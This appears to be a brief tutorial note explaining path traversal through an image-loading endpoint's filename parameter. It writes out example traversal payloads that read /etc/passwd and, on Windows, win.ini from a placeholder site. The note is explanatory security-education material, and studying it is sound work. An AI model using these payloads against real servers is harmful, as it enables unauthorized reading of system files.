# Path Traversal

## Reading arbitrary files via path traversal


if a image loaded within a HTML as a form of

`<img src="/loadImage?filename=218.png">`

The `loadImage` URL takes a `filename` parameter and returns the contents of the specified file. The image files are stored on disk in the location `/var/www/images/`.

the application reads from the following file path:

`/var/www/images/218.png`

Without proper url sanitization, the bad apple could abuse the exploit this vulnerability 

`https://insecure-website.com/loadImage?filename=../../../etc/passwd`

This causes the application to read from the following file path:

`/var/www/images/../../../etc/passwd`

So the modified url is actually reading at

`/etc/passwd`

On **Windows**, both `../` and `..\` are valid directory traversal sequences. The following is an example of an equivalent attack against a Windows-based server:

`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`